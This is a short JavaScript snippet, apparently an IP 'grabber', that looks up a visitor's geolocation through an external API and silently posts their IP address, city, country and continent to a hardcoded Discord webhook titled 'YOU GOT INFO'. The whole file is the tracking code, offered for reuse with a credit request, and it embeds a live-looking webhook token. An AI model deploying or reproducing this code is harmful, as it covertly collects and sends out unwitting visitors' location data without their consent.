$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) { //Make sure to use this api or use another but you got to change the values down below
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1344027418637111398/5Z1Gb_hx-b8asiWXOaMhm0UmQkkwE6-16oTCpiDK1cr4lEASsnNQAE-UgWgDNmldEjlM");
  
    request.setRequestHeader('Content-type', 'application/json');
  
    var t = {
      username: "GrabUrMom",
      avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
      content: "",
      embeds: [{
          color: "4700374",
          title: "YOU GOT INFO",
          fields: [
            {name: "IP", value: data.ip_address},
            {name: "CITY", value: data.city},
            {name: "COUNTRY", value: data.country},
            {name: "CONTINENT", value: data.continent},
          ],
          footer: {
              text: "By hawda | "
          }
      }]
  };
  
    request.send(JSON.stringify(t));
})

//credit if you make a better one.
